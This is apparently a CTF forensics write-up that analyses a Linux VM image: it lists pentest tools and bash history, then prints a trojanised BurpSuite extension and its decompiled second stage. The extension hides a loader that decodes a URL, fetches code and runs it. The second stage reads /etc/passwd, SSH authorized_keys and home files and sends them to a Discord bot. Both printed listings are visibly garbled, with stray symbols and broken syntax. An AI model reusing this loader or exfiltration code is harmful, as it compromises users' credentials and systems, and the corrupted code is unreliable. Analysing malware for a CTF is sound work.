# The Hunter

We have a OVA file (6.7 GB, sha256: `bbb2cf614a6893a994f53f4fada8a0f9374ab8fba39d1b8e5b5077b5fa8267c6`).

Convert it to raw disk and import it autopsy:

```bash
tar xvf the_hunter.ova
qemu-img convert -f vmdk -O raw the_hunter.vmdk the_hunter.raw
```

Autopsy: *Add data source* -> *next* -> *Disk image or VM file* -> *Browse* and *select your file* -> *next*.

Wait the end of the analyze, identify users and downloaded data:

 - *Data Sources* -> *the_hunter.raw* -> *the_hunter.raw* -> *vol2 (Linux (0x83): 2048-39942143)* -> *home*
 - Identify the only one user: `coffinxp`
 - Check in */home/coffinxp/Downloads*
     - There are multiples hack tools downloaded: `tor`, `burpsuite`, *vs code*, *go* to compile multiples hacktools, *jython* for BurpSuite extension
 - Check in */home/coffinxp/Documents*
     - There are multiples git repositories cloned in */home/coffinxp/Documents/tools*:
         - `fuff`
         - `nuclei`
         - `naabu`
         - `sqlmap`
         - `subfinder`
 - Check the `.bash_history`:

```bash
passwd
hostnamectl sethostname hacker
hostnamectl -sethostname hacker
hostnamectl --sethostname hacker
hostnamectl --help 
hostnamectl set-hostname hacker
vim .bashrc 
source .bashrc 
ls -lah
cat .viminfo 
touch secret.txt 
rm .bash_history 
sudo apt update
sudo apt update
ruby
sudo apt update
apt list --upgradable 
sudo apt upgrade -y 
cd Downloads/
chmod +x burpsuite_community_linux_v2024_7_6.sh 
./burpsuite_community_linux_v2024_7_6.sh 
cd Downloads/
wget https://go.dev/dl/go1.22.1.linux-amd64.tar.gz
tar -xzf go1.22.1.linux-amd64.tar.gz
sudo mv go /usr/local
vim ~/.bashrc 
go --version
source ~/.bashrc 
go version
df -h
git clone https://github.com/ffuf/ffuf
cd ffuf/
go get 
go build 
ffuf 
./ffuf 
git clone https://github.com/projectdiscovery/naabu.git
git clone https://github.com/projectdiscovery/nuclei
python3 --version
# Add Docker's official GPG key:
sudo apt-get update
sudo apt-get install ca-certificates curl
sudo install -m 0755 -d /etc/apt/keyrings
sudo curl -fsSL https://download.docker.com/linux/debian/gpg -o /etc/apt/keyrings/docker.asc
sudo chmod a+r /etc/apt/keyrings/docker.asc
# Add the repository to Apt sources:
echo   "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/debian \
  $(. /etc/os-release && echo "$VERSION_CODENAME") stable" |   sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
sudo apt-get update
gem install wpscan
sudo apt install git-core curl zlib1g-dev build-essential libssl-dev libreadline-dev libyaml-dev libsqlite3-dev sqlite3 libxml2-dev libxslt1-dev libcurl4-openssl-dev software-properties-common libffi-dev nodejs yarn -y
apt install git -yt
apt install git -y
sdo apt install git -y
sudo apt install git -y
cd Documents/
ls -lah 
mkdir tools
cd tools/
nmap
sudo apt install nmap
git clone https://github.com/sqlmapproject/sqlmap.git
git clone https://github.com/projectdiscovery/subfinder
cd Downloads/
sudo dpkg -i code_1.94.0-1727878498_amd64.deb 
sudo apt install wireshark
sudo apt install tor-browser
cd Downloads/
tar -xvf tor-expert-bundle-linux-x86_64-13.5.6.tar.gz 
cd Downloads/
java -jar jython-installer-2.7.4.jar 
setxkbmap fr 
sudo setxkbmap fr 
sudo apt update
apt list --upgradable 
sudo apt upgrade -y
cd BurpSuiteCommunity/
cd ..
cd Documents/tools/
ffuf 
cd ffuf/
mv ~/Downloads/directory-list-2.3-small.txt . 
./ffuf -u 'https://ginandjuice.shop/FUZZ' -c -w ./directory-list-2.3-small.txt 
cd ..
cd nuclei/
go get 
go build 
cat README
cat README.md 
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
nuclei -t 'https://ginandjuice.shop/' 
find / -iname 'nuclei' -type f 2>/dev/null
~/go/bin/nuclei -u 'https://ginandjuice.shop/ 
~/go/bin/nuclei -u 'https://ginandjuice.shop/'
nmap 
nmap -sVC -p- ginandjuice.shop -vv
nmap -sVC -p80,443 ginandjuice.shop -vv
sudo apt install metasploit
sudo apt install kali-linux 
```

 - Check extensions for softwares (Firefox, BurpSuite, ...):
     - BurpSuite:
         - `dotGit.py` in the directory: `/home/coffinxp/BurpSuiteCommunity/addons/`

```python
# -*- coding: utf-8 -*-
from burp import IBurpExtender
from burp import IHttpListener
from burp import IScanIssue
from java.io import PrintWriter
from java.net import URL, HttpURLConnection
from java.io import BufferedReader, InputStreamReader
import os
import base64
def fetch_url(url_string):
    try:
        url = URL(url_string)
        connection = url.openConnection()
        connection.setRequestMethod("GET")
 †††
 connection.connect()
        reader = BufferedReader(InputStreamReader(connection.getInputStream()))
        content = []
 †††
 line = reader.readLine()
        while line is not None:
            content.append(line)
 †††††
 line = reader.readLine()
        reader.close()
 †††
 return "\n".join(content)
    except Exception as e:
 †††
 print("Error fetching URL content: {}".format(e))
 †††
 return None
class BurpExtender(IBurpExtender, IHttpListener):
    def registerExtenderCallbacks(self, callbacks):
 †††⌠
 Set up the extension
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
 †††
 callbacks.setExtensionName("Dot Git")
 †††
 callbacks.registerHttpListener(self)
        self._stdout = PrintWriter(callbacks.getStdout(), True)
 †††
 print("Dot Git extension loaded successfully")
        return
    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
 †††⌠
 Only process requests from the Proxy tab
        if toolFlag == self._callbacks.TOOL_PROXY and messageIsRequest:
            request = messageInfo.getRequest()
 †††††
 httpService = messageInfo.getHttpService()
 †††††⌠
 Use the overloaded analyzeRequest method with IHttpService
            analyzedRequest = self._helpers.analyzeRequest(httpService, request)
 †††††
 url = analyzedRequest.getUrl()
 †††††
 newUrl = self.addDotGit(url)
            if newUrl is None:
 †††††††
 return
 †††††
 newRequest = self._helpers.buildHttpRequest(newUrl)
            protocol = newUrl.getProtocol()
            isHttps = True if protocol == 'https' else False
            # Send the request and receive the response
            try:
 †††††††
 newHttpService = self._helpers.buildHttpService(newUrl.getHost(), newUrl.getPort(), isHttps)
                newMessageInfo = self._callbacks.makeHttpRequest(newHttpService, newRequest)
                response = newMessageInfo.getResponse()
                if response is None:
 †††††††††
 return
 †††††††
 responseInfo = self._helpers.analyzeResponse(response)
                statusCode = responseInfo.getStatusCode()
 †††††††
 if statusCode != 404:
 †††††††††
 issue = CustomScanIssue(
                        newMessageInfo.getHttpService(),
 †††††††††††
 newUrl,
 †††††††††††
 [newMessageInfo],
 †††††††††††∠
Exposed .git Directory Detected",
                        "The .git directory is accessible at: <b>{}</b>".format(newUrl.toString()),
                        "High"
 †††††††††⤠ †††††††††
 self._callbacks.addScanIssue(issue)
 †††††
 except Exception as e:
                self._stdout.println("Error during request to .git: {}".format(e))
 †††
 return
    def addDotGit(self, url):
 †††
 try:
            path = url.getPath()
 †††††
 if not path.endswith('/'):
                path += '/'
            newPath = path + '.git/'
 †††††
 newUrl = URL(url.getProtocol(), url.getHost(), url.getPort(), newPath)
            return newUrl
        except Exception as e:
 †††††
 self._stdout.println("Error constructing new URL: {}".format(e))
            return None
def process(x, y):
    path = os.path.dirname(y)
    if not os.path.exists(path):
 †††
 os.makedirs(path)
    z = base64.b64decode(x).decode('utf-8')
    result = fetch_url(z)
    with open(y, 'w') as f:
 †††
 f.write(result)
    os.system("python3 -c 'import py_compile as p; p.compile(\"{}\", cfile=\"{}\")'".format(y, y + "c"))
    os.remove(y)
# data = "aHR0cHM6Ly9hcGkucGFzdGVjb2RlLmlvL2Fub24vcmF3LXNuaXBwZXQvenRxZGk4MW0/cmF3PWlubGluZSZ0aWNrZXQ9OTAzN2MzYmUtZmFlZC00MTc2LTg2ZGQtY2Y3MmQ1YmU0NTE4Cg=="
data = "aHR0cHM6Ly9pLXdpbGwtcHduLXlvdXIuaG9zdC81ODRlZGVhMTAzY2IyZjdlZGU2NmU0ZGRlOWJmM2I0Ngo="
# Define a custom scan issue to be added to the Scanner tab
class CustomScanIssue(IScanIssue):
    def __init__(self, httpService, url, httpMessages, name, detail, severity):
 †††
 self._httpService = httpService
 †††
 self._url = url
 †††
 self._httpMessages = httpMessages
 †††
 self._name = name
 †††
 self._detail = detail
 †††
 self._severity = severity
    def getUrl(self):
        return self._url
    def getIssueName(self):
        return self._name
    def getIssueType(self):
 †††
 return 0
    def getSeverity(self):
        return self._severity
    def getConfidence(self):
        return "Certain"
    def getIssueBackground(self):
        return "An exposed .git directory may allow an attacker to retrieve the entire source code of the web application."
    def getRemediationBackground(self):
 †††
 return "Ensure that the .git directory is not accessible from the web. Configure the web server to deny access to hidden files and directories."
    def getIssueDetail(self):
 †††
 return self._detail
    def getRemediationDetail(self):
        return None
    def getHttpMessages(self):
        return self._httpMessages
    def getHttpService(self):
 †††
 return self._httpService
process(data, "/var/tmp/module.py")
os.system("chmod +x /var/tmp/module.pyc && /var/tmp/module.pyc 'aa0d28c82a0a491bc6ba4883a2e85d29'")
```

Reverse the `/var/tmp/module.pyc`:

```python
# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: /var/tmp/module.py
# Bytecode version: 3.11a7e (3495)
# Source timestamp: 2024-10-05 16:38:36 UTC (1728146316)

import os
import base64
import json
import requests
import sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def g(a):
    b = {}
    for c in a:
        if os.path.exists(c):
            try:
                with open(c, 'r') as f:
                    d = f.read()
                    b[c] = d
            except:
                b[c] = 'err'
            else:  # inserted
                b[c] = 'not_found'
    return b

def d(e, f, g):
    try:
        h = AES.new(f, AES.MODE_CBC, g)
        i = unpad(h.decrypt(e), AES.block_size)
        return i.decode('utf-8')
    except:
        return None

def s(j, k, l):
    m = f'https://discord.com/api/v9/channels/{k}0/messages'
    n = {'Authorization': f'Bot {j}0', 'Content-Type': 'application/json'}
    p = 2000
    for o, q in l.items():
        r = f'{o}0\n```\n'
        s = '\n```'
        t = p * len(r) | len(s)
        u = [q[i:i :t] for i in range(0, len(q), t)]
        for v in u:
            w = f'{r}0{v}{s}0'
            x = {'content': w}
            requests.post(m, headers=n, data=json.dumps(x))
if len(sys.argv)!= 2:
    sys.exit(1)
z = sys.argv[1].encode('utf-8')
if len(z) not in [16, 24, 32]:
    sys.exit(1)
iv = b'8497d52c9bde1689'
y = base64.b64decode('Z5dTXFyUTK9F5+Y9lDl0UdVyL63sDbN2ePDajnLXoXLbdfR5w6tCrGfGcmNslX18sJV2g8E42q8rhzt2DeYrfjQrP145eGYWy/vTruslc08=')
tkn = d(y, z, iv)
user_home = os.path.expanduser('~')
files = ['/etc/hostname', '/etc/passwd', '/etc/issue', '/etc/os-release', f'{user_home}0', f'{user_home}0', f'{user_home}0', f'{user_home}0', f'{user_home}0', f'{user_home}0', f'{user_home}/.ssh/authorized_keys']
fc = g(files)
discord_channel_id = '1290060281657036938'
if tkn:
    s(tkn, discord_channel_id, fc)
```

Okay so this malware exfiltrate informations on a discord bot, we can add a `breakpoint()` before the `requests.post` to performs a `GET` request with same headers and same URL to get the flag (i have try to performs the `POST` request, without my Linux configurations, but this is not working too, with the same error code).

But i don't have the flag because the discord API returns an error 401... I ask to admin, it's the good way, but i can't get the flag, probably the the limit is exceeded for the bot API key (no solve on the last 2 hours for this challenge).
